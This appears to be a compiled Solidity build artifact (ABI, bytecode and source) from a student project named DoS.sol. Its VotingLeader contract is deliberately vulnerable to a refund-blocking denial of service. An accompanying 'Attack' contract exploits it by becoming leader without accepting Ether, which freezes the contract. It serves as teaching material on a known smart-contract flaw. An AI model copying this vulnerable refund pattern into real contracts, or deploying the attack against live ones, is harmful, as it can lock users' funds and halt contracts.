{
  "contractName": "VotingLeader",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "Leader",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "PriceValue",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "setValue",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610396806100606000396000f3fe6080604052600436106100345760003560e01c80634fa519fa14610039578063aa3ae5d214610043578063c9e19d4c1461006e575b600080fd5b610041610099565b005b34801561004f57600080fd5b506100586101bd565b6040516100659190610228565b60405180910390f35b34801561007a57600080fd5b506100836101e1565b604051610090919061025c565b60405180910390f35b60015434116100dd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100d4906102fa565b60405180910390fd5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001546040516101269061034b565b60006040518083038185875af1925050503d8060008114610163576040519150601f19603f3d011682016040523d82523d6000602084013e610168565b606091505b5050905080156101ba5734600181905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610212826101e7565b9050919050565b61022281610207565b82525050565b600060208201905061023d6000830184610219565b92915050565b6000819050919050565b61025681610243565b82525050565b6000602082019050610271600083018461024d565b92915050565b600082825260208201905092915050565b7f4e65656420746f2073656c656374206d6f7265207468616e207468652063757260008201527f72656e742076616c756500000000000000000000000000000000000000000000602082015250565b60006102e4602a83610277565b91506102ef82610288565b604082019050919050565b60006020820190508181036000830152610313816102d7565b9050919050565b600081905092915050565b50565b600061033560008361031a565b915061034082610325565b600082019050919050565b600061035682610328565b915081905091905056fea26469706673582212204e21372d524c1d5596619c6699d950d17e45f0802e9b5725165e96a3741e5ec464736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.8.19;\r\n\r\ncontract VotingLeader {\r\n\r\n    address public Leader; //Current voting leader\r\n    uint public PriceValue; //Current value\r\n\r\n    constructor() { Leader = msg.sender; } //set owner address as current leader\r\n    \r\n    function setValue() public payable { //value setting \r\n        require(\r\n        msg.value > PriceValue, \"Need to select more than the current value\"\r\n        );\r\n        (bool sent, ) = Leader.call{value: PriceValue}(\"\"); //calling current leader address + set current value\r\n        if (sent) {\r\n            PriceValue = msg.value; //update value after Ether sent\r\n            Leader = msg.sender; //update current leader\r\n        }\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    VotingLeader votingleader;\r\n    constructor(address _votingleader) {\r\n        votingleader = VotingLeader(_votingleader); //Initialising variable with vulnerable contract\r\n    }\r\n    function attack() public payable {\r\n        votingleader.setValue{value: msg.value}(); //calling the value set and sending Ether recieved\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Individual Project\\Smart Contracts\\contracts\\DoS.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-04-22T17:37:36.487Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}